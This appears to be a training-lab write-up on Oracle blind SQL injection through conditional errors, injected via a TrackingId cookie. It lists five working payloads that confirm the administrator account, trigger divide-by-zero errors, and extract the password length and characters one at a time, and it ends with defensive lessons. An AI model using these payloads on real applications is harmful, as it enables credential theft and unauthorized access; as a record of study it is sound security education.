# Lab Name
Blind SQL injection with conditional errors.

## Vulnerability
Blind SQL Injection 

## Objective
Demonstrate exploitation of blind SQL injection using conditional error-based inference to extract administrator credentials.

## Entry Point
TrackingId cookie parameter was vulnerable to SQL injection.

## Payload Used
-	'||(SELECT NULL FROM dual)||'

  <img width="1497" height="787" alt="0 1" src="https://github.com/user-attachments/assets/9c89d699-48a3-484e-8aff-cf5088650a62" />

-	'||(SELECT NULL FROM users WHERE username='administrator')||'

  <img width="1487" height="786" alt="0 2" src="https://github.com/user-attachments/assets/aae995bf-b5ed-4f02-b3ed-43dd78e8a482" />

-	'||(SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' END FROM dual )||'

  <img width="1486" height="766" alt="0 3" src="https://github.com/user-attachments/assets/efbc62bd-8e20-4121-9795-4f520bbeba6b" />

-	'||(SELECT CASE WHEN (LENGTH (password)= 20) THEN TO_CHAR (1/0) ELSE '' END FROM users WHERE username= 'administrator' )||'

  <img width="1497" height="786" alt="0 4" src="https://github.com/user-attachments/assets/7366289d-7957-499b-824c-9e6ee46948a7" />

-	'||(SELECT CASE WHEN (SUBSTR (password,1,1)= 'x') THEN TO_CHAR (1/0) ELSE '' END FROM users WHERE username= 'administrator' )||'

  <img width="1887" height="970" alt="0 5" src="https://github.com/user-attachments/assets/2f746f0a-6419-425e-bdc6-8617fe3772ad" />

## Result
Successfully extracted the administrator password and authenticated as administrator.

## Learning
- Blind SQL Injection does not display data directly; attacker must infer results from application behavior.
- Conditional error technique forces the database to throw an error when a condition is true.
- Oracle-specific features like DUAL table and TO_CHAR(1/0) can be used to trigger controlled errors.
- Data extraction is performed character-by-character using SUBSTR() and LENGTH().
- Proper understanding of query structure and context is critical to avoid syntax errors.
- Even when error messages are hidden, behavior-based inference allows full data extraction.
- Input validation and parameterized queries are essential to prevent SQL injection.
